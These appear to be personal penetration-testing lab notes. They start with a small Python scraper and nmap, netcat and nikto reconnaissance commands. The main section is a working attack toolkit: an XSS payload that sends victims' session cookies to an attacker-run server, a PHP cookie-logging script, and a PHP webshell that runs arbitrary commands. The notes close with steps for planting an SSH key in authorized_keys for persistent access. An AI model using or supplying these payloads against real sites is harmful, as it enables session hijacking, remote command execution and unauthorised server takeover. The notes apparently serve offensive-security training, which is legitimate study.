Website Scraper 

#!/usr/bin/python3

## IMPORTS ##
import lxml.html
import requests

## Grabs Webpage ##
page = requests.get('http://quotes.toscrape.com') (this is the website to change)
tree = lxml.html.fromstring(page.content)

## Outlines Tags You Want to Grab ##
# Change//small[..] to whatever tag you want. Leave /text() #
authors = tree.xpath('//small[@class="author"]/text()')

## Print (duh) ##
print ('Authors: ',authors)

Dont use Python3, use python2

frontend = the website you can access normally - backend = the server the website is stored on
can use 0.0.0.0 to reference yourself and any tunnels you have setup to websites

Example scan 
nmap -Pn -T4 10.50.37.95 -p 22,80,8080,8888,2222,4444
(use nmap only for single targets)

after getting ports banner grab using netcat
nc 10.50.37.95 22

Ping sweep example
for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done 
(run this as close to the network you are trying to scan as possible, also dont scan the grey host network)

can use (previous nmap scan) --script banner.nse which automatically banner grabs ports that nmap finds
can use (previous nmap scan) --script http-enum.nse used for websites to enumerate well known paths
can use (previous nmap scan) --script smb-os-dicovery.nse (for windows machines)

nikto -host <ip address> (-port used if port is weird) can be used to get more website related information for an ip

========================================== COOKIE STEALING ===========================================
<script>document.location="<http://your opstation ip:8000/>"+document.cookie;</script>
run python3 -m http.server on your opstation before embedding the above code into the website to receive the cookie you just captured

cookie stealer file (CookieSteal.php)
<?php
$cookie = $_GET["username"]
$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+")
fwrite($steal, $cookie . "\n")
fclose($steal)
?>

(create a cookiefile.txt for the variable $steal)
upload these files and then use <script>document.location="http://<ServerIP>/uploads/cookiestealer.php?username="+document.cookie;</script> on the vulnerable website using XXS

webshell.php file
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
}
?>
</pre>
</BODY></HTML>

to use this file also upload it to the vulnerable website to gain a basic shell on the box through the website

use the webshell to get cmd injection which means you can run any command using ; <cmd to run>
to gain access to the box using webshell: use whoami to see who you are then get your home directory
after finding your directory do ssh-keygen -t rsa -b 4096 and pay attention to where the keys are gonna be saved with no passphrase(just hit enter twice)
take the .ssh/id_rsa.pub and copy just the key into the previously discovered home folder for your account on the webshell
on this home folder ; mkdir <absolute path to home directory>/.ssh then echo "your copied public key" > <your home directory>/.ssh/authorized_keys
from here you should be able to ssh straight into the target from your box using ssh -i <where your private key is(ssh_rsa)> www-data@<target box>


